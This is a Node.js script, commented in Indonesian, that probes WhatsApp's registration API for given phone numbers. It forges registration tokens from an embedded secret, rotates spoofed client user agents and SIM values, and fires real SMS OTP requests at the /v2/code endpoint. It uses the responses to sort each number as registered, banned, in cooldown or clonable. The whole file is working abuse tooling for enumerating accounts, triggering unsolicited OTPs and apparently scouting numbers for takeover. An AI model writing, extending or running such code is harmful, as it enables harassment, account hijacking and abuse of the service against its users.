// probe.js — WA OTP probe + state detection
// Method: 2-stage (exist check → code endpoint cooldown probe)
// Node 18+, axios
// Set DEBUG=1 di .env buat raw log

import axios  from 'axios';
import crypto from 'crypto';

const DEBUG = process.env.DEBUG === '1';

// ─── constants ────────────────────────────────────────────────────────────────

// User-agent pool — rotate tiap request
const UA_POOL = [
  'WhatsApp/2.24.13.76 A',
  'WhatsApp/2.24.11.75 A',
  'WhatsApp/2.24.9.73 A',
  'WhatsApp/2.24.6.77 A',
  'WhatsApp/2.23.24.81 A',
];

// WA token secret — dikenal publik, derive dari APK (stabil lintas versi minor)
// Dipakai untuk HMAC-SHA1 token generation
const TOKEN_SECRET = Buffer.from(
  'PkTwKSZqUfAUyR0rPQ8hYe0sBc9W7ZIef3jbXq5EBaw=',
  'base64'
);

// ─── helpers ──────────────────────────────────────────────────────────────────

function rndUA() {
  return UA_POOL[Math.floor(Math.random() * UA_POOL.length)];
}

function rndId() {
  return crypto.randomBytes(8).toString('hex');
}

/**
 * Buat WA registration token yang valid
 * HMAC-SHA1(secret, phone_digits + timestamp_in_minutes)
 * lalu encode base64url, potong 24 karakter
 */
function buildToken(phone) {
  const digits = phone.replace('+', '');
  const ts     = Math.floor(Date.now() / 60_000).toString(); // per-menit biar stabil
  const hmac   = crypto.createHmac('sha1', TOKEN_SECRET)
                        .update(digits + ts)
                        .digest('base64url');
  return hmac.slice(0, 24);
}

function splitPhone(phone) {
  const d = phone.replace('+', '');
  // Handle common country codes: 62 (ID), 60 (MY), 65 (SG), 1 (US/CA)
  if (d.startsWith('1')  && d.length >= 11) return { cc: '1',  inn: d.slice(1) };
  if (d.startsWith('62') && d.length >= 11) return { cc: '62', inn: d.slice(2) };
  if (d.startsWith('60') && d.length >= 10) return { cc: '60', inn: d.slice(2) };
  if (d.startsWith('65') && d.length >= 10) return { cc: '65', inn: d.slice(2) };
  // Generic: 2-digit cc
  if (d.length >= 10) return { cc: d.slice(0, 2), inn: d.slice(2) };
  return { cc: d.slice(0, 1), inn: d.slice(1) };
}

function baseHeaders(ua) {
  return {
    'User-Agent':       ua,
    'Accept':           'application/json, text/plain, */*',
    'Accept-Language':  'id-ID,id;q=0.9,en-US;q=0.8',
    'Accept-Encoding':  'gzip, deflate, br',
    'Connection':       'keep-alive',
  };
}

// ─── stage 1: exist check ─────────────────────────────────────────────────────
// GET /v2/exist — cuma cek apakah nomor terdaftar WA, tidak trigger OTP
// Response: { status: "ok", login: "6281xxx" } | { status: "fail", reason: "..." }

async function existCheck(phone) {
  const { cc, inn } = splitPhone(phone);
  const ua = rndUA();

  const url = `https://v.whatsapp.net/v2/exist`;
  const params = {
    cc,
    in:  inn,
    id:  rndId(),
    lg:  'id',
    lc:  'ID',
  };

  try {
    const res = await axios.get(url, {
      params,
      headers:        { ...baseHeaders(ua) },
      timeout:        10_000,
      validateStatus: () => true,
    });

    if (DEBUG) {
      console.log(`[EXIST] ${phone} | HTTP ${res.status} | ${JSON.stringify(res.data)}`);
    }

    return { status: res.status, body: res.data };
  } catch (err) {
    if (DEBUG) console.log(`[EXIST ERR] ${phone} | ${err.message}`);
    return { status: 0, body: null, err: err.message };
  }
}

// ─── stage 2: code endpoint — buat deteksi cooldown & state detail ────────────
// POST /v2/code — trigger OTP request, baca response buat state

async function codeProbe(phone) {
  const { cc, inn } = splitPhone(phone);
  const ua = rndUA();

  const params = new URLSearchParams({
    cc,
    in:                  inn,
    lg:                  'id',
    lc:                  'ID',
    mistyped:            '6',
    multidevice:         '1',
    method:              'sms',
    sim_mcc:             '510',
    sim_mnc:             '001',
    network_radio_type:  '1',
    reason:              '',
    token:               buildToken(phone),
    id:                  rndId(),
    backup_token:        '',
  });

  try {
    const res = await axios.post(
      `https://v.whatsapp.net/v2/code`,
      params.toString(),
      {
        headers: {
          ...baseHeaders(ua),
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        timeout:        12_000,
        validateStatus: () => true,
      }
    );

    if (DEBUG) {
      console.log(`[CODE] ${phone} | HTTP ${res.status} | ${JSON.stringify(res.data)}`);
    }

    return { status: res.status, body: res.data };
  } catch (err) {
    if (DEBUG) console.log(`[CODE ERR] ${phone} | ${err.message}`);
    return { status: 0, body: null, err: err.message };
  }
}

// ─── parse state dari code endpoint ──────────────────────────────────────────

function parseCodeResponse(status, body, state) {
  if (!body) return state;

  const s      = String(body.status || '').toLowerCase();
  const reason = String(body.reason || '').toLowerCase();
  const retry  = parseInt(
    body.retry_after ?? body.sec_wait ?? body.retry_after_secs ?? body.retry ?? '0',
    10
  ) || 0;

  // OTP berhasil dikirim
  if (s === 'sent' || s === 'ok') {
    state.registered    = true;
    state.canReceiveOTP = true;
    state.cloneSupport  = body.voice_length !== undefined || body.flash_type !== undefined;
    return state;
  }

  // Cooldown — too recent
  if (s === 'too_recent' || s === 'too-recent' || reason === 'too_recent') {
    state.registered    = true;
    state.cooldown      = true;
    state.cooldownSecs  = retry > 0 ? retry : null;
    state.canReceiveOTP = false;
    return state;
  }

  // Banned
  if (s === 'blocked' || s === 'banned' || reason === 'blocked') {
    state.registered    = true;
    state.banned        = true;
    state.bannedType    = retry > 0 ? 'temporary' : 'permanent';
    state.canReceiveOTP = false;
    return state;
  }

  // Nomor tidak terdaftar / tidak ada
  if (reason === 'bad_param' || s === 'fail' && reason === '') {
    state.registered    = false;
    state.canReceiveOTP = false;
    return state;
  }

  // Rate limit / too many requests
  if (reason === 'too_many_requests' || s === 'rate_limit') {
    state.registered    = true;
    state.limitActive   = true;
    state.limitType     = 'rate';
    state.canReceiveOTP = false;
    return state;
  }

  // Akun baru
  if (reason === 'new_acct' || reason === 'new_account') {
    state.registered    = true;
    state.limitActive   = true;
    state.limitType     = 'new_account';
    state.canReceiveOTP = false;
    return state;
  }

  // Spam
  if (reason === 'spam') {
    state.registered    = true;
    state.limitActive   = true;
    state.limitType     = 'spam';
    state.canReceiveOTP = false;
    return state;
  }

  // No routes — nomor GA support OTP via SMS (VoIP / nomor virtual)
  if (reason === 'no_routes' || s === 'no_routes') {
    state.registered     = true; // bisa jadi terdaftar tapi ga bisa terima OTP
    state.noCloneSupport = true;
    state.canReceiveOTP  = false;
    return state;
  }

  // Multi-device mismatch
  if (reason === 'mismatch' || reason === 'no_multidevice') {
    state.registered     = true;
    state.noCloneSupport = true;
    state.canReceiveOTP  = false;
    return state;
  }

  // Token rejected / auth problem
  if (status === 401 || status === 403) {
    // Tandai sebagai unknown — mungkin terdaftar tapi token kita kena filter
    state.registered    = true;
    state.canReceiveOTP = false;
    state.tokenRejected = true;
    return state;
  }

  // HTTP 200 tapi status field asing — anggap registered
  if (status === 200) {
    state.registered = true;
    return state;
  }

  return state;
}

// ─── format cooldown ──────────────────────────────────────────────────────────

/**
 * Format detik ke string human-readable
 * @param {number} secs
 * @returns {string|null}
 */
export function fmtCooldown(secs) {
  if (!secs || secs <= 0) return null;
  const d = Math.floor(secs / 86400);
  const h = Math.floor((secs % 86400) / 3600);
  const m = Math.floor((secs % 3600) / 60);
  const s = secs % 60;
  const parts = [];
  if (d) parts.push(`${d}h`);
  if (h) parts.push(`${h}j`);
  if (m) parts.push(`${m}m`);
  if (s && !d && !h) parts.push(`${s}d`);
  return parts.join(' ') || '< 1m';
}

// ─── main export ──────────────────────────────────────────────────────────────

/**
 * Probe satu nomor WA — 2-stage
 * Stage 1: exist check (lightweight, no OTP trigger)
 * Stage 2: code probe (for cooldown / state detail)
 *
 * @param {string} phone — E.164 dengan +
 * @returns {Promise<object>}
 */
export async function probeNumber(phone) {
  const state = {
    phone,
    registered:     false,
    banned:         false,
    bannedType:     null,       // 'permanent' | 'temporary'
    cooldown:       false,
    cooldownSecs:   null,
    cloneSupport:   false,
    noCloneSupport: false,
    limitActive:    false,
    limitType:      null,       // 'spam' | 'new_account' | 'rate'
    tokenRejected:  false,
    canReceiveOTP:  true,
    raw:            null,
    httpStatus:     0,
    method:         null,       // 'exist' | 'code' — method yang kasih hasil
  };

  // ── Stage 1: exist check ──
  const existRes = await existCheck(phone);
  state.raw        = existRes.body;
  state.httpStatus = existRes.status;

  if (existRes.body) {
    const s      = String(existRes.body.status || '').toLowerCase();
    const reason = String(existRes.body.reason || '').toLowerCase();

    // Nomor jelas tidak terdaftar
    if (s === 'fail' && (reason === 'bad_param' || reason === 'not_exist' || existRes.body.login === undefined)) {
      if (DEBUG) console.log(`[EXIST HIT] ${phone} → not registered`);
      state.registered    = false;
      state.canReceiveOTP = false;
      state.method        = 'exist';
      return state;
    }

    // Terdaftar — exist endpoint konfirmasi
    if (s === 'ok' && existRes.body.login) {
      state.registered = true;
      state.method     = 'exist';
      if (DEBUG) console.log(`[EXIST HIT] ${phone} → registered`);
      // Lanjut ke stage 2 buat cooldown check
    }
  }

  // ── Stage 2: code probe — deteksi cooldown & state detail ──
  const codeRes = await codeProbe(phone);
  state.raw        = codeRes.body;
  state.httpStatus = codeRes.status;
  state.method     = state.method ? state.method + '+code' : 'code';

  parseCodeResponse(codeRes.status, codeRes.body, state);

  return state;
}
